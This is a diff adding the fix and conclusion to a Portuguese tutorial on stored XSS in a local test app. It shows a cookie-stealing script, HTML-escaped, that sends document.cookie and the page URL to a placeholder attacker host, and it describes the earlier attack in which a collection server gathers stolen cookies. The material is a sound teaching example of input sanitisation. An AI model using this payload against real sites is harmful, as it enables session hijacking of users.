@@ -87,3 +87,32 @@ Envie o comentário: Clique em "Enviar". A página irá recarregar e exibir a me
 Verifique o ataque: Volte para a página inicial da aplicação (http://127.0.0.1:5000). O navegador, ao renderizar o comentário, executará o script. Ele tentará carregar a imagem, o que fará uma requisição GET para o seu servidor de coleta, enviando o cookie.
 
 Confirme o sucesso: Verifique o seu servidor de coleta. O arquivo cookies_roubados.txt deve ter sido criado e conter o cookie roubado.
+
+# Passo 4: Correção
+
+Arquivo -> app_corrigido.py
+
+A função escape() (ou uma equivalente em outras linguagens/frameworks) converte caracteres especiais de HTML, como < e >, em suas entidades HTML correspondentes, como &lt; e &gt;.
+
+Após a sanitização, a entrada do atacante se tornaria:
+
+HTML
+
+&lt;script&gt;
+    fetch('http://servidor-do-atacante.com/roubar_dados', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            cookie: document.cookie,
+            url: window.location.href
+        })
+    });
+&lt;/script&gt;
+
+O navegador do usuário, ao encontrar &lt; e &gt;, os interpretará como texto literal e não como tags HTML. O script não será executado, e o ataque de Cross-Site Scripting (XSS) terá sido prevenido.
+
+# Conclusão
+
+Este estudo de caso demonstra como a ausência de um controle de segurança simples, como a validação e sanitização de entrada, pode levar a uma vulnerabilidade crítica de XSS. A implementação desse controle em uma fase inicial de desenvolvimento (no SSDLC) é uma prática de baixo custo e alta eficácia para proteger os usuários e a integridade da aplicação.
